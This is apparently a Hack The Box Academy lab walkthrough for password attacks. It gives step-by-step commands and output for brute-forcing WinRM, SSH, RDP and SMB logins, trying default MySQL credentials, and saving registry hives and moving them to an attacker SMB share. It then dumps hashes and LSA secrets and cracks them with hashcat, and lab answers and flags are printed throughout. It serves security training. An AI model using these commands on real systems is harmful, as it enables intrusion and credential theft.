```shell
sudo losetup -f -P Private.vhd
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ sudo losetup -f -P Private.vhd
```

Students will confirm if this was successful and what is the name of the loop device by executing:

Code: shell

```shell
losetup --all
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[/dev]
└──╼ [★]$ losetup --all

/dev/loop0: []: (/home/htb-ac-569447/Private.vhd)
```

Students will make a note with the device name `/dev/loop0` as this will be needed for the `dislocker` command.

`Dislocker` will need to be installed as such:

Code: shell

```shell
sudo apt-get install dislocker -y
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ sudo apt-get install dislocker -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Preparing to unpack .../dislocker_0.7.3-3_amd64.deb ...
Unpacking dislocker (0.7.3-3) ...
Setting up libdislocker0.7 (0.7.3-3) ...
Setting up dislocker (0.7.3-3) ...
Processing triggers for man-db (2.11.2-2) ...
Processing triggers for libc-bin (2.36-9+deb12u9) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Once this installation is finished, students will need to decrypt the drive using `dislocker`:

Code: shell

```shell
sudo dislocker /dev/loop0p1 -ufrancisco -- /media/bitlocker
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[/dev]
└──╼ [★]$ sudo dislocker /dev/loop0p1 -ufrancisco -- /media/bitlocker
```

The command above will generate a file named `dislocker-file` inside `/media/bitlocker/`, which can be confirmed by executing `ls` on `/media/bitlocker/`.

Code: shell

```shell
sudo ls -la /media/bitlocker
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ sudo ls -la /media/bitlocker

total 4
dr-xr-xr-x 2 root root        0 Dec 31  1969 .
drwxr-xr-x 5 root root     4096 Jun  4 09:27 ..
-rw-rw-rw- 1 root root 63963136 Dec 31  1969 dislocker-file
```

Students will then mount this file `dislocker-file` on `/media/bitlockermount`.

Code: shell

```shell
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Students will change directories using `cd` to `/media/bitlockermount` and get the contents of `flag.txt` using `cat`.

Code: shell

```shell
cd /media/bitlockermount; cat flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[/media/bitlockermount]
└──╼ [★]$ cd /media/bitlockermount; cat flag.txt

{hidden}
```

Answer: `43d95aeed3114a53ac66f01265f9b7af`

# Network Services

## Question 1

### “Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Students will then be navigating to the `Resources` tab within the module page, copy the link for the `PW-Attacks` file and download it.

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/147/network-services.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eghos1lidv]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/147/network-services.zip
--2025-09-04 02:58:11--  https://academy.hackthebox.com/storage/modules/147/network-services.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.69, 109.176.239.70
Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1681 (1.6K) [application/zip]
Saving to: ‘network-services.zip’

network-services.zip 100%[===================>]   1.64K  --.-KB/s    in 0s      

2025-09-04 02:58:11 (21.9 MB/s) - ‘network-services.zip’ saved [1681/1681]
```

With the file downloaded, students can proceed to extract its contents by running the following command:

Code: shell

```shell
unzip network-services.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eghos1lidv]─[~]
└──╼ [★]$ unzip network-services.zip 
Archive:  network-services.zip
  inflating: username.list           
  inflating: password.list
```

At this point, the extracted archive provides two essential wordlists: `username.list` and `password.list`, both located in the current working directory.

Students will use either `CrackMapExec` or `NetExec` to brute-force the WinRM service using the extracted wordlists.

The syntax is as follows: `crackmapexec [protocol] [ip] -u [username_wordlist] -p [password_wordlist]`:

Code: shell

```shell
crackmapexec winrm STMIP -u username.list -p password.list
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eghos1lidv]─[~]
└──╼ [★]$ crackmapexec winrm 10.129.239.240 -u username.list -p password.list

WINRM       10.129.239.240  5985   WINSRV           [*] Windows 10 / Server 2019 Build 17763 (name:WINSRV) (domain:WINSRV)
<SNIP>
WINRM       10.129.239.240  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

Students will notice that they successfully brute-forced a valid credential pair: the user `john` with the password `november`.

Using the credentials found earlier, students will log in via `evil-winrm`, a tool designed for interacting with the WinRM protocol.

Code: shell

```shell
evil-winrm -i STMIP -u john -p november
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eghos1lidv]─[~]
└──╼ [★]$ evil-winrm -i 10.129.239.240 -u john -p november
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```

Students will now have a shell on the target machine, starting in the `C:\Users\john\Documents` directory. To locate the flag file, students may either browse manually or use a recursive PowerShell search like the following:

Code: shell

```shell
Get-ChildItem -Path ., .. -Recurse -Filter "flag*"
```

```shell-session
*Evil-WinRM* PS C:\Users\john\Documents> Get-ChildItem -Path ., .. -Recurse -Filter "flag*"

    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   8:13 AM             18 flag.txt
```

After locating the flag file, students will use the `type` command to display its contents:

Code: shell

```shell
type C:\Users\john\Desktop\flag.txt
```

```shell-session
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\flag.txt

{hidden}
```

Answer: `HTB{That5Novemb3r}`

# Network Services

## Question 2

### “Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.“

Students will use `Hydra` to attack the `SSH`, using the wordlists `username.list` and `password.list` that can be obtained from extracting the [network-services.zip](https://academy.hackthebox.com/storage/modules/147/network-services.zip) file:

Code: shell

```shell
hydra -L username.list -P password.list ssh://STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ hydra -L username.list -P password.list ssh://10.129.202.136

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-03 11:05:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
[DATA] attacking ssh://10.129.202.136:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
```

After obtaining the credentials for user `dennis` from `Hydra`'s output, students will now `SSH` into the target using these credentials.

Code: shell

```shell
ssh dennis@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ ssh dennis@10.129.202.136

The authenticity of host '10.129.202.136 (10.129.202.136)' can't be established.
ED25519 key fingerprint is SHA256:dRz9BL6NhfzNWUhWdhoTCZB0pFXi+moLOqEj4XlPHOY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.136' (ED25519) to the list of known hosts.
dennis@10.129.202.136's password: 

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

dennis@WINSRV C:\Users\dennis>
```

With a shell as user `dennis`, students need to read the flag file, which is located at `C:\Users\dennis\Desktop\flag.txt`:

Code: shell

```shell
type .\Desktop\flag.txt
```

```shell-session
dennis@WINSRV C:\Users\dennis>type .\Desktop\flag.txt

{hidden}
```

Answer: `HTB{Let5R0ck1t}`

# Network Services

## Question 3

### “Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.“

Students will use `Hydra` to attack `RDP`, using the wordlists `username.list` and `password.list`  obtained from extracting the [network-services.zip](https://academy.hackthebox.com/storage/modules/147/network-services.zip) file:

Code: shell

```shell
hydra -L username.list -P password.list rdp://STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ hydra -I -L username.list -P password.list rdp://10.129.202.136

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-03 11:35:12
<SNIP>
[3389][rdp] host: 10.129.202.136   login: chris   password: 789456123
```

Students will now establish an `RDP` session using the credentials obtained via brute-force using `Hydra`:

Code: shell

```shell
xfreerdp /v:STMIP /u:chris /p:789456123
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.136 /u:chris /p:789456123

<SNIP>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the flag file and submit it as the answer.

Answer: `HTB{R3m0t3DeskIsw4yT00easy}`

# Network Services

## Question 4

### “Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.“

Students will use the `smb_login` module from `Metasploit` to attack `SMB`, using the wordlists `username.list` and `password.list` obtained from extracting the [network-services.zip](https://academy.hackthebox.com/storage/modules/147/network-services.zip) file, and set its options accordingly, most importantly using `password.list` and `username.list` for `PASS_FILE` and `USER_FILE`, respectively. This can be done by doing the following:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
set VERBOSE false
run
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set PASS_FILE password.list
PASS_FILE => password.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set USER_FILE username.list
USER_FILE => username.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set RHOST 10.129.202.136
RHOST => 10.129.202.136
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set VERBOSE false
VERBOSE => false
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> run
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\john:november'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\dennis:rockstar'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\chris:789456123'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\cassie:12345678910'
```

After running the attack, students will find the credentials `cassie:12345678910`, subsequently, they need to use `smbclient` in order to enumerate `SMB` and get a list of shares available on the spawned target machine:

Code: shell

```shell
smbclient -U cassie -L '\\STMIP\'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ smbclient -U cassie -L '\\10.129.202.136\'

Password for [WORKGROUP\cassie]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CASSIE          Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.202.136 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Subsequently, students need to connect to the share `CASSIE` by using `smbclient`, list the contents of the file share and `get` the file `flag.txt`:

Code: shell

```shell
smbclient -U cassie '\\STMIP\CASSIE'
dir
get flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ smbclient -U cassie '\\10.129.202.136\CASSIE'
Password for [WORKGROUP\cassie]:

Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jan  6 11:48:47 2022
  ..                                 DR        0  Thu Jan  6 11:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 08:44:52 2022
  flag.txt                            A       16  Thu Jan  6 08:46:14 2022

		10328063 blocks of size 4096. 6417214 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 16 as flag.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

At last, students will disconnect from the session by either using `Ctrl+C` or writing either `exit` or `quit` in the `SMB` session, and then read the flag file using `cat`:

Code: shell

```shell
cat flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-ilh3hpemyb]─[~]
└──╼ [★]$ cat flag.txt

{hidden}
```

Answer: `HTB{S4ndM4ndB33}`

# Spraying, Stuffing, and Defaults

## Question 1

### “Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: <username>:<password>)“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `SSH` to get a shell in the target machine with username `sam` and password `B@tm@n2022!`.

Code: shell

```shell
ssh sam@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ ssh sam@10.129.206.122

The authenticity of host '10.129.206.122 (10.129.206.122)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.206.122' (ED25519) to the list of known hosts.
sam@10.129.206.122's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

<SNIP>

sam@nix01:~$
```

Students will open another terminal in their attacking machine and install the [Default Credentials Cheat Sheet Tool](https://github.com/ihebski/DefaultCreds-cheat-sheet) by using `pip3 install` and search for default credentials for `MySQL` using `creds search`:

Code: shell

```shell
pip3 install defaultcreds-cheat-sheet
creds search mysql
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[/~]
└──╼ [★]$ pip3 install defaultcreds-cheat-sheet

Defaulting to user installation because normal site-packages is not writeable
Collecting defaultcreds-cheat-sheet
  Downloading defaultcreds_cheat_sheet-0.5.3.0-py3-none-any.whl.metadata (4.0 kB)

<SNIP>

Successfully installed defaultcreds-cheat-sheet-0.5.3.0 fire-0.7.0 prettytable-3.16.0 tinydb-4.8.2

[notice] A new release of pip is available: 25.0.1 -> 25.1.1
[notice] To update, run: python3.11 -m pip install --upgrade pip

┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[/~]
└──╼ [★]$ creds search mysql

+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
```

Students will try these default credentials in order to connect to `MySQL` on `localhost` as follows:

Code: shell

```shell
mysql -h localhost -usuperdba -p
```

```shell-session
sam@nix01:~$ mysql -h localhost -usuperdba -p

Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 82
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Students will then submit the valid credentials in the format `username:password` as the answer.

Answer: `superdba:admin`

# Attacking SAM, SYSTEM, and SECURITY

## Question 1

### “Where is the SAM database located in the Windows registry? (Format: \_\_\_\_\*\_\_\*)“

By reading the section, students will understand that the `SAM (Security Account Manager) database` is located in the Windows Registry under the hive: `HKLM\SAM`

This registry hive stores `password hashes for local user accounts`, which are essential for local authentication.

Answer: `HKLM\SAM`

# Attacking SAM, SYSTEM, and SECURITY

## Question 2

### “Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `RDP` to get a session in the target machine with username `Bob` and password `HTB_@cademy_stdnt!`.

Code: shell

```shell
xfreerdp /v:STMIP /u:Bob /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~]
└──╼ [★]$ xfreerdp /v:10.129.181.195 /u:Bob /p:HTB_@cademy_stdnt!

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Once the `RDP` session has been established, students will open a new command prompt with Administrative privileges as such:

![Password_Attacks_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_1.png)

Students will then use `reg.exe` to save copies of the `SAM`, `SYSTEM` and `SECURITY` registry hives as follows:

Code: cmd

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```cmd-session
C:\Windows\system32>reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Once this is done, students will return to their workstations and use `smbserver.py` with the `-smb2support` option, followed by the name of the share and the path where the `SMB` share is served from, in this case `/home/htb-ac-XXXXXX/Documents` but students will have to edit this accordingly.

Code: shell

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-XXXXXX/Documents
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-569447/Documents

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
06/05/2025 04:02:14 AM: INFO: Config file parsed
```

Students will return to the `RDP` session and move the copies of the `SAM`, `SYSTEM` and `SECURITY` registry hives to the newly created share, effectively transferring these files from the remote host to the attacker host.

Code: cmd

```cmd
move C:\sam.save \\PWNIP\CompData
move C:\system.save \\PWNIP\CompData
move C:\security.save \\PWNIP\CompData
```

```cmd-session
C:\Windows\system32>move C:\sam.save \\10.10.14.241\CompData
        1 file(s) moved.
C:\Windows\system32>move C:\system.save \\10.10.14.241\CompData
        1 file(s) moved.
C:\Windows\system32>move C:\security.save \\10.10.14.241\CompData
        1 file(s) moved.
```

Once this step is complete, students can close their `SMB` share by pressing `Ctrl + C` and confirm that the files were successfully transferred to the designated path used on the `smbserver.py` command, in this case `/home/htb-ac-569447/Documents`.

Code: shell

```shell
cd /home/htb-ac-569447/Documents; ls
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~]
└──╼ [★]$ cd /home/htb-ac-569447/Documents; ls

sam.save  security.save  system.save
```

From here students will need to use Impacket's tool `secretsdump` to dump the hashes as follows:

Code: shell

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up...
```

Students can see that `secretsdump` successfully dumped the local `SAM` hashes in the format `(uid:rid:lmhash:nthash)` and students will copy these entries to a file:

Code: shell

```shell
cat << EOF > samhashes.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ cat << EOF > samhashes.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
EOF
```

Then students will process this file using `cut` in order to extract only the NT hashes and output this into a new file. Additionally, students will take note of the NT hash used by user `ITbackdoor` which is `c02478537b9727d391bc80011c2e2321` in order to be able to answer the question later on.

Code: shell

```shell
cut -d ':' -f 4 samhashes.txt > nthashes.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ cut -d ':' -f 4 samhashes.txt > nthashes.txt
```

Students will then use `hashcat` to crack these NT hashes using the option `-m 1000` which corresponds to the NT hash cracking mode followed by a wordlist such as `rockyou.txt`:

Code: shell

```shell
sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

c02478537b9727d391bc80011c2e2321:{hidden}                   
a3ecf31e65208382e23b3420a34208fc:mommy1                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123              
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: nthashes.txt
Time.Started.....: Thu Jun  5 04:33:20 2025 (2 secs)
Time.Estimated...: Thu Jun  5 04:33:22 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)

<SNIP>
```

Students will now compare the previously noted NT hash for user `ITbackdoor` to the ones that `hashcat` was able to crack. Students will notice that the hash for `ITbackdoor` was cracked and the plaintext password is now visible in the `hashcat` output or alternatively use the option `--show` :

Code: shell

```shell
sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 --show
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 --show
c02478537b9727d391bc80011c2e2321:{hidden}
```

Answer: `matrix`

# Attacking SAM, SYSTEM, and SECURITY

## Question 3

### “Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)“

Students will need to dump the `LSA` secrets on the remote host, for this, users can use `NetExec` or `CrackMapExec` using the `--lsa` option.

Code: shell

```shell
netexec smb STMIP --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-6bpqfyrlpo]─[~/Documents]
└──╼ [★]$ netexec smb 10.129.181.195 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.181.195  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.181.195  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.181.195  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.181.195  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.181.195  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.181.195  445    FRONTDESK01      {hidden}:Password123
